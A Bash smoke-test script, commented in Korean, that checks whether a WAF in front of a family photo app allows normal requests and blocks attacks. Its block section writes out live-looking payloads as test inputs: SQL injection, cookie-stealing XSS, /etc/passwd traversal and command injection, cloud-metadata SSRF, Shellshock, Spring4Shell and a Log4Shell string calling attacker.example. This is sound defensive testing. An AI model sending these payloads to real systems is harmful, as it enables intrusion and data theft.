#!/usr/bin/env bash
# ─────────────────────────────────────────────────────────────────────────────
# WAF 스모크 테스트: 정상 요청은 통과하고 공격 요청은 WAF가 차단하는지 외부에서 확인합니다.
#
#   tests/waf-smoke-test.sh [-k] [-r IP] [--rate] [--large] https://photos.example.com
#
#   -k        인증서 검증 생략 (자체 서명 인증서)
#   -r IP     DNS 대신 이 IP로 접속 (curl --resolve)
#   --rate    로그인 비율 제한(429)도 확인 — 이후 5분간 이 IP의 로그인 요청이 막힙니다
#   --large   40MB 업로드 거부(413)도 확인
#
# 대상 호스트가 block 모드여야 합니다(count 모드면 공격 요청도 통과로 나옵니다).
# 판정 기준: WAF가 만든 응답만 "차단"으로 봅니다(code WAF_* 또는 WAF 안내 페이지).
# 앱이 반환하는 401/403/404 등은 "통과"입니다.
# ─────────────────────────────────────────────────────────────────────────────
set -u

INSECURE=() RESOLVE=() RATE=0 LARGE=0 BASE=""
while [ $# -gt 0 ]; do
  case "$1" in
    -k) INSECURE=(-k) ;;
    -r) RESOLVE_IP=$2; shift ;;
    --rate) RATE=1 ;;
    --large) LARGE=1 ;;
    -h|--help) sed -n '2,17p' "$0"; exit 0 ;;
    *) BASE=${1%/} ;;
  esac
  shift
done
[ -n "$BASE" ] || { echo "사용법: $0 [-k] [-r IP] [--rate] [--large] https://host" >&2; exit 2; }
HOST=$(echo "$BASE" | sed -E 's#^https?://([^/:]+).*#\1#')
PORT=$(echo "$BASE" | sed -nE 's#^https?://[^/:]+:([0-9]+).*#\1#p'); PORT=${PORT:-443}
# -r 로 IP를 지정하면 프록시(HTTPS_PROXY 등)를 거치지 않고 그 IP로 직접 접속합니다.
[ -n "${RESOLVE_IP:-}" ] && RESOLVE=(--resolve "$HOST:$PORT:$RESOLVE_IP" --noproxy "$HOST")

TMP=$(mktemp -d); trap 'rm -rf "$TMP"' EXIT
PASS=0 FAIL=0 FAILED=()

# WAF가 만든 응답인지 판별: JSON code(WAF_*) 또는 WAF 안내 페이지 제목
classify() { # status body_file → allow | block | rate | size | unavailable
  local code=$1 f=$2
  case "$code" in
    403) grep -q -e '"WAF_BLOCKED"' -e '요청이 차단되었습니다' "$f" && { echo block; return; } ;;
    429) grep -q -e '"WAF_RATE_LIMITED"' -e '요청이 너무 많습니다' "$f" && { echo rate; return; } ;;
    413) grep -q -e '"WAF_TOO_LARGE"' -e '요청이 너무 큽니다' "$f" && { echo size; return; } ;;
    503) grep -q -e '"WAF_UNAVAILABLE"' -e '보안 검사 서비스' "$f" && { echo unavailable; return; } ;;
    000) echo "conn-error"; return ;;
  esac
  echo allow
}

# check <이름> <기대(allow|block|rate|size)> <curl 인자...>
check() {
  local name=$1 want=$2; shift 2
  local code got rid
  code=$(curl -sS -o "$TMP/body" -D "$TMP/hdr" -w '%{http_code}' --max-time 60 \
    "${INSECURE[@]}" "${RESOLVE[@]}" -H 'Expect:' "$@" 2>"$TMP/err") || true
  got=$(classify "${code:-000}" "$TMP/body")
  rid=$(grep -i '^x-request-id:' "$TMP/hdr" 2>/dev/null | tr -d '\r' | awk '{print $2}')
  if [ "$got" = "$want" ]; then
    PASS=$((PASS + 1)); printf '  \033[32mOK\033[0m   %-38s %-6s %s\n' "$name" "$code" "$got"
  else
    FAIL=$((FAIL + 1)); FAILED+=("$name")
    printf '  \033[31mFAIL\033[0m %-38s %-6s %s (기대: %s) id=%s %s\n' "$name" "$code" "$got" "$want" "${rid:--}" "$(head -c 120 "$TMP/err")"
  fi
}

JSON=(-H 'Content-Type: application/json' -H "Origin: $BASE")
SESSION='__Host-fp_session=Q2xhdWRlIFdhZiB0ZXN0IHNlc3Npb24gdG9rZW4gMDAx; fp_family=cm4x9w2k10000qp08abcd1234'
RSC_TREE='%5B%22%22%2C%7B%22children%22%3A%5B%22(app)%22%2C%7B%22children%22%3A%5B%22albums%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2C%22%2Falbums%22%2C%22refresh%22%5D%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D'

# 업로드용 multipart 본문: JPEG 시그니처 + 임의 바이트
mkpart() { # 파일 크기(바이트) → $TMP/upload.bin
  local size=$1
  { printf -- '--BOUNDARY\r\nContent-Disposition: form-data; name="familyId"\r\n\r\ncm4x9w2k10000qp08abcd1234\r\n'
    printf -- '--BOUNDARY\r\nContent-Disposition: form-data; name="file"; filename="IMG_2034.JPG"\r\nContent-Type: image/jpeg\r\n\r\n'
    printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00'; head -c "$size" /dev/urandom
    printf -- '\r\n--BOUNDARY--\r\n'; } > "$TMP/upload.bin"
}

echo "대상: $BASE"
echo
echo "[정상 요청 — 통과해야 함]"
check "page /login"                      allow "$BASE/login"
check "health /api/health"               allow "$BASE/api/health"
check "static /_next/static"             allow "$BASE/_next/static/chunks/app/layout-3f2a1b.js"
check "search korean"                    allow -G "$BASE/api/photos" --data-urlencode "q=엄마 생일 케이크" --data-urlencode "preset=30d" -d dateField=taken -d limit=48 -b "$SESSION"
check "search date range + cursor"       allow -G "$BASE/api/photos" -d dateField=taken -d from=2026-01-01 -d to=2026-12-31 -d cursor=cm9zq8x1v0001ab12cd34ef56 -b "$SESSION"
check "next rsc navigation"              allow "$BASE/albums?_rsc=1xq7z" -H 'RSC: 1' -H "Next-Router-State-Tree: $RSC_TREE" -H 'Next-Url: /albums' -b "$SESSION"
check "invite page"                      allow "$BASE/invite/4f1c2a9b8e7d6c5b4a39281706f5e4d3c2b1a09f8e7d6c5b4a3928170615243f"
check "login (password with quotes)"     allow -X POST "$BASE/api/auth/login" "${JSON[@]}" --data-raw '{"email":"mom@example.com","password":"p@ss'"'"' OR 1=1 -- <b>x</b>"}'
check "photo description (korean)"       allow -X PATCH "$BASE/api/photos/cm4x9w2k10000qp08abcd1234" "${JSON[@]}" -b "$SESSION" --data-raw '{"description":"할머니 댁에서 찍은 사진 :) Mom'"'"'s birthday - 다음엔 바다 가자! #가족 (2026)"}'
check "album create"                     allow -X POST "$BASE/api/albums" "${JSON[@]}" -b "$SESSION" --data-raw '{"familyId":"cm4x9w2k10000qp08abcd1234","name":"2026 추석","description":"할아버지 & 할머니, 사촌들과 함께"}'
check "album update PUT"                 allow -X PUT "$BASE/api/albums/cm4x9w2k10000qp08abcd1234" "${JSON[@]}" -b "$SESSION" --data-raw '{"coverPhotoId":"cm4x9w2k10000qp08abcd9999"}'
check "favorite POST (no body)"          allow -X POST "$BASE/api/photos/cm4x9w2k10000qp08abcd1234/favorite" -H "Origin: $BASE" -b "$SESSION"
check "photo DELETE"                     allow -X DELETE "$BASE/api/photos/cm4x9w2k10000qp08abcd1234?permanent=1" -H "Origin: $BASE" -b "$SESSION"
mkpart 20000
check "upload small (inspected)"         allow -X POST "$BASE/api/photos/upload" -H "Origin: $BASE" -b "$SESSION" -H 'Content-Type: multipart/form-data; boundary=BOUNDARY' --data-binary @"$TMP/upload.bin"
mkpart 3000000
check "upload 3MB (body skipped)"        allow -X POST "$BASE/api/photos/upload" -H "Origin: $BASE" -b "$SESSION" -H 'Content-Type: multipart/form-data; boundary=BOUNDARY' --data-binary @"$TMP/upload.bin"

echo
echo "[공격 요청 — 차단해야 함]"
check "sqli query"                       block -G "$BASE/api/photos" --data-urlencode "q=1' UNION SELECT email,password FROM \"User\"--"
check "sqli json body"                   block -X PATCH "$BASE/api/albums/cm4x9w2k10000qp08abcd1234" "${JSON[@]}" --data-raw '{"name":"x'"'"' OR '"'"'1'"'"'='"'"'1'"'"' --"}'
check "xss query"                        block -G "$BASE/login" --data-urlencode "next=<script>alert(document.cookie)</script>"
check "xss json body"                    block -X PATCH "$BASE/api/photos/cm4x9w2k10000qp08abcd1234" "${JSON[@]}" --data-raw '{"description":"<img src=x onerror=alert(document.cookie)>"}'
check "path traversal"                   block -G "$BASE/api/photos" --data-urlencode "q=../../../../etc/passwd"
check "command injection"                block -G "$BASE/api/photos" --data-urlencode "q=;cat /etc/passwd"
check "ssrf metadata"                    block -G "$BASE/api/photos" --data-urlencode "q=http://169.254.169.254/latest/meta-data/iam/"
check "php injection"                    block -G "$BASE/api/photos" --data-urlencode "q=<?php system('id'); ?>"
check "log4shell header"                 block "$BASE/" -H 'X-Api-Version: ${jndi:ldap://attacker.example/a}'
check "shellshock user-agent"            block "$BASE/" -A '() { :; }; /bin/bash -c "cat /etc/passwd"'
check "scanner user-agent"               block "$BASE/" -A 'sqlmap/1.8.2#stable (https://sqlmap.org)'
check "prototype pollution"              block -X POST "$BASE/api/albums" "${JSON[@]}" --data-raw '{"__proto__":{"isAdmin":true}}'
check "method TRACE"                     block -X TRACE "$BASE/"
check "java deserialization"             block "$BASE/" -H 'X-Payload: rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3Rvcg'
check "spring4shell"                     block -X POST "$BASE/api/albums" -H 'Content-Type: application/x-www-form-urlencoded' --data 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=x'
check "next.js middleware bypass"        block "$BASE/admin" -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'
check "next.js server action"            block -X POST "$BASE/" -H 'Next-Action: 7f3a9c2e1b' -H 'Content-Type: text/plain;charset=UTF-8' --data '[]'
check "next.js image optimizer"          block -G "$BASE/_next/image" --data-urlencode "url=http://169.254.169.254/" -d w=64 -d q=75
check "exploit path /.env"               block "$BASE/.env"
check "exploit path /.git/config"        block "$BASE/.git/config"
check "exploit path /wp-login.php"       block "$BASE/wp-login.php"
check "exploit path /actuator/env"       block "$BASE/actuator/env"

echo
echo "[크기 제한 — 413]"
head -c 100000 /dev/zero | tr '\0' 'a' | sed 's/^/{"description":"/; s/$/"}/' > "$TMP/big.json"
check "json body 100KB (oversize)"       size -X POST "$BASE/api/albums" "${JSON[@]}" --data-binary @"$TMP/big.json"
echo
echo "[본문 검사 우회 시도 — 413]"
printf '{"name":"x'"'"' OR '"'"'1'"'"'='"'"'1'"'"' --","pad":"%s"}' "$(head -c 50000 /dev/zero | tr '\0' 'b')" > "$TMP/sqli50k.json"
check "chunked body (no Content-Length)" size --http1.1 -X POST "$BASE/api/albums" "${JSON[@]}" -H 'Transfer-Encoding: chunked' --data-binary @"$TMP/sqli50k.json"
PAD=(); for i in $(seq 1 18); do PAD+=(-H "X-Pad-$i: $(head -c 6000 /dev/zero | tr '\0' 'a')"); done
check "header padding (partial body)"    size --http1.1 -X POST "$BASE/api/albums" "${JSON[@]}" "${PAD[@]}" --data-binary @"$TMP/sqli50k.json"
check "same body, normal request"        block -X POST "$BASE/api/albums" "${JSON[@]}" --data-binary @"$TMP/sqli50k.json"

if [ "$LARGE" = 1 ]; then
  head -c 41943040 /dev/zero > "$TMP/huge.bin"
  check "upload 40MB (max_upload_bytes)" size -X POST "$BASE/api/photos/upload" -H 'Content-Type: multipart/form-data; boundary=BOUNDARY' --data-binary @"$TMP/huge.bin"
fi

if [ "$RATE" = 1 ]; then
  echo
  echo "[비율 기반 규칙 — 429]"
  got429=0
  for i in $(seq 1 60); do
    code=$(curl -sS -o "$TMP/body" -w '%{http_code}' --max-time 10 "${INSECURE[@]}" "${RESOLVE[@]}" -X POST "$BASE/api/auth/login" "${JSON[@]}" --data-raw '{"email":"x@example.com","password":"wrong-password"}')
    if [ "$(classify "$code" "$TMP/body")" = rate ]; then got429=$i; break; fi
  done
  if [ "$got429" -gt 0 ]; then
    PASS=$((PASS + 1)); printf '  \033[32mOK\033[0m   %-38s %s번째 요청에서 429\n' "login rate limit" "$got429"
  else
    FAIL=$((FAIL + 1)); FAILED+=("login rate limit"); printf '  \033[31mFAIL\033[0m %-38s 60회 요청에도 429 없음\n' "login rate limit"
  fi
fi

echo
echo "결과: 통과 $PASS, 실패 $FAIL"
[ "$FAIL" -eq 0 ] || { printf '실패: %s\n' "${FAILED[*]}"; echo "실패한 요청은 'wafctl events --since 10m' 또는 /var/log/modsec-spoa/waf.log 에서 요청 ID로 확인하세요."; exit 1; }
